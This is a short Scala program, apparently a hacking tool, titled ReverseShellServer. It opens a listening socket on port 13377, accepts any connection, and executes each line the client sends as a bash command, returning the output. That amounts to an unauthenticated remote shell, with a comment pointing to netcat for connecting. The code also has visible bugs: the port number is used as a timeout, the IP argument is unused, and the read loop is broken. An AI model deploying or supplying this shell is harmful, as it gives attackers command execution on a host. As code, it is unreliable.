import java.io._
import java.net._

object ReverseShellServer {
  def main(args: Array[String]): Unit = {
    val banner =
      """
        |  _____            _      _____          _
        | |  __ \          | |    / ____|        | |
        | | |__) |___  __ _| |___| |     ___   __| | ___
        | |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
        | | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
        |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
      """.stripMargin

    val po = 13377 // nc -l -p 13377
    val serverSocket = new ServerSocket(po)
    serverSocket.setSoTimeout(po)

    if (args.length < 1) {
      println("Please provide the IP address as a command-line argument.")
      System.exit(1)
    }

    val ip = args(0)
    val clientIp = InetAddress.getLocalHost.getHostAddress
    val fullBanner = s"$banner\nClient IP: $clientIp\n"

    while (true) {
      val clientSocket = serverSocket.accept()
      val out = new PrintWriter(clientSocket.getOutputStream, true)
      val in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream))

      out.println(fullBanner)
      var line = in.readLine()

      while (line != null) {
        out.print("$ ")
        out.flush()

        val cmd = in.readLine().trim

        if (cmd == "exit") {
          clientSocket.close()
          System.exit(0)
        } else {
          val process = Runtime.getRuntime.exec(Array("bash", "-c", s"$cmd 2>&1"))
          val output = new BufferedReader(new InputStreamReader(process.getInputStream))

          var outputLine = output.readLine()
          while (outputLine != null) {
            out.println(outputLine)
            outputLine = output.readLine()
          }
        }
      }

      clientSocket.close()
    }
  }
}
